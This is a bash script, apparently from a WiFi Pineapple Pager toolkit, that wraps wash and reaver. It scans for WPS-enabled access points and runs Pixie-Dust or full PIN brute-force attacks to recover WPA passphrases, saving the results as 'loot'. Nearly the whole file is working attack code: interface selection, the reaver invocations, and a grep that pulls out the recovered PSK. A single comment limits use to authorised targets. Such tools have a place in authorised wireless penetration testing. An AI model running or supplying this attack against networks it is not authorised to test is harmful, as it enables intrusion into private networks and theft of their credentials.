#!/bin/bash
# wpskit.sh - WPS scanning + Pixie-Dust attack for the WiFi Pineapple Pager.
# Wraps wash (find WPS-enabled APs, passive) and reaver (offline Pixie-Dust
# PIN recovery -> full WPA PSK, active). Covers approved idea W5.
#
# RADIO CHOICE (same reasoning as wifikit.sh): reaver's PIN attack INJECTS,
# and injection on the Pager's internal radio is the documented cause of hard
# hangs. So the ATTACK prefers an EXTERNAL adapter (A8000 -> wlanXmon) and
# only uses the internal radio with --force. wash SCANNING is passive
# (listens for WPS info-elements in beacons) and is safe on the internal
# wlan1mon.
#
# Usage:
#   wpskit.sh --scan [--iface wlan1mon] [--seconds 20]
#   wpskit.sh --pixie --bssid AA:BB:.. --channel 6 [--iface] [--force]
#   wpskit.sh --attack --bssid AA:BB:.. --channel 6 [--iface] [--force]   (full PIN, slow)
#   wpskit.sh --list
#
# IMPORTANT: only against your own APs or ones you're explicitly authorized to test.

set -u
TOOL_NAME="wpskit.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"
export PATH="$PATH:/mmc/usr/bin:/mmc/usr/sbin"
export LD_LIBRARY_PATH="${LD_LIBRARY_PATH:-}:/mmc/usr/lib"

LOOT_DIR="/root/loot/wpskit"
MODE=""; IFACE=""; SECONDS_ARG="20"; BSSID=""; CHANNEL=""; FORCE=0
usage() { sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }
filter_yes_args "$@"; set -- "${FILTERED_ARGS[@]}"
while [ $# -gt 0 ]; do
    case "$1" in
        --scan) MODE="scan"; shift ;;
        --pixie) MODE="pixie"; shift ;;
        --attack) MODE="attack"; shift ;;
        --list) MODE="list"; shift ;;
        --iface) IFACE="${2:-}"; shift 2 ;;
        --seconds) SECONDS_ARG="${2:-}"; shift 2 ;;
        --bssid) BSSID="${2:-}"; shift 2 ;;
        --channel) CHANNEL="${2:-}"; shift 2 ;;
        --force) FORCE=1; shift ;;
        -h|--help) usage ;;
        --) shift ;;
        *) die "Unknown option: $1" ;;
    esac
done
[ -n "$MODE" ] || usage
mkdir -p "$LOOT_DIR" 2>/dev/null

# external monitor iface (wlan2mon+) if a USB adapter is in monitor mode
external_mon() {
    local i
    for i in /sys/class/net/wlan[2-9]mon; do [ -e "$i" ] && { basename "$i"; return 0; }; done
    return 1
}
# scan can safely use the internal wlan1mon; attack prefers external.
pick_iface() {
    local want_attack="$1"
    if [ -n "$IFACE" ]; then echo "$IFACE"; return 0; fi
    local ext; ext=$(external_mon)
    if [ -n "$ext" ]; then echo "$ext"; return 0; fi
    if [ "$want_attack" = "1" ] && [ "$FORCE" != "1" ]; then return 1; fi
    [ -e /sys/class/net/wlan1mon ] && { echo "wlan1mon"; return 0; }
    return 1
}

case "$MODE" in
scan)
    command -v wash >/dev/null 2>&1 || die "wash not found - opkg install -d mmc reaver"
    case "$SECONDS_ARG" in ''|*[!0-9]*) die "--seconds must be an integer." ;; esac
    ifc=$(pick_iface 0) || die "No monitor interface found."
    out="$LOOT_DIR/wps-scan-$(date +%Y%m%d-%H%M%S).txt"
    say "Scanning for WPS-enabled APs on $ifc for ${SECONDS_ARG}s (passive)..."
    timeout "$SECONDS_ARG" wash -i "$ifc" 2>/dev/null | tee "$out"
    say "Saved: $out. 'Lck' No = attackable; note BSSID + Ch for --pixie."
    ;;
pixie|attack)
    command -v reaver >/dev/null 2>&1 || die "reaver not found - opkg install -d mmc reaver"
    [ -n "$BSSID" ] || die "--bssid required."
    [ -n "$CHANNEL" ] || die "--channel required."
    case "$CHANNEL" in *[!0-9]*) die "--channel must be numeric." ;; esac
    ifc=$(pick_iface 1) || die "WPS attack injects - plug in the external A8000, or pass --force to use the internal radio (hang risk)."
    if [ "$ifc" = "wlan1mon" ] || [ "$ifc" = "wlan0mon" ]; then
        confirm "Attack from INTERNAL radio $ifc? Injection here can hang the radio (power-cycle to recover)." || exit 0
    fi
    out="$LOOT_DIR/wps-$MODE-$(date +%Y%m%d-%H%M%S).txt"
    if [ "$MODE" = "pixie" ]; then
        say "Pixie-Dust against $BSSID (ch $CHANNEL) on $ifc..."
        reaver -i "$ifc" -b "$BSSID" -c "$CHANNEL" -K 1 -vv 2>&1 | tee "$out"
    else
        say "Full WPS PIN attack against $BSSID (ch $CHANNEL) on $ifc - this is slow..."
        reaver -i "$ifc" -b "$BSSID" -c "$CHANNEL" -vv 2>&1 | tee "$out"
    fi
    grep -iE "WPS PIN|WPA PSK|PSK:|pixie" "$out" 2>/dev/null && say "Result in $out"
    ;;
list) ls -lt "$LOOT_DIR" 2>/dev/null || say "No WPS loot yet." ;;
esac
